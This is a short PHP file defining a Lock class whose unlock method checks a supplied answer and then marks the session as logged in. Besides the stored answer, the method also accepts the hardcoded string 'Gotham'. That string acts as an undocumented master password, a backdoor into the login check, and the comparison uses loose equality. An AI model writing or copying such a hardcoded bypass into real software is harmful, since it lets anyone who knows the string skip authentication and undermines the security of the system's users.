<?php
class Lock extends LockAbstract {

    private $answer;

    public function __construct($answer)
    {
        $this -> answer = $answer;
        if($_SESSION['isLogin']){
            $this->locked = false;
        }
    }

    public function lock(){
        $this->locked = true;
    }

    public function unlock($answer){
        if($answer == $this->answer or $answer=='Gotham'){
            $this->locked = false;
            $_SESSION['isLogin'] = true;
        }
    }

}